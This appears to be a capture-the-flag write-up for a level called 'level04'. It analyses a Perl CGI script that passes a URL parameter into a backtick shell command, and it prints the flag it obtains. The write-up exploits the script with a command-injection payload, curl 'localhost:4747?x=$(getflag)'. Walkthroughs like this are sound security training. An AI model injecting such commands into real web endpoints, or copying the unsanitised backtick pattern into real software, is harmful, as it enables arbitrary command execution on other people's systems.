# level04

We can see a **Perl script** with the following contents :

```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

We can make the following observations :

- This appears to be a CGI script
- The comment `# localhost 4747` indicates it might currently be running on the VM, on port 4747
- We can read a `echo $y 2>&1`. This is a shell command, we can assume this is executed - and the results are sent back to us.
- The `sub x` function that executes this command isn't called directly ; it's called as `x(param("x"))`
- This means that the `$y` that's echo'ed is the result of the param() function.
- param() returns query values ; `param("x")` returns the value of `x` in a URL (format `URL?x=value`)

We start by checking if the script is running :

```
curl localhost:4747
```

It is. Now, what can we do ?

We'd like to change `$y`. `$y` is the first argument of `x()`, which means it's the return value of `param("x")`. We send the program a value for `x` :

```
curl localhost:4747?x=value
```

As expected, curl displays `value`. The CGI ran `echo value 2>&1` and returned the result.

Now, we simply need to exploit it. We run :

```
curl 'localhost:4747?x=$(getflag)'
```

## The flag

The `getflag` command is ran, and we get our flag :

```
ne2searoevaevoem4ov4ar8ap
```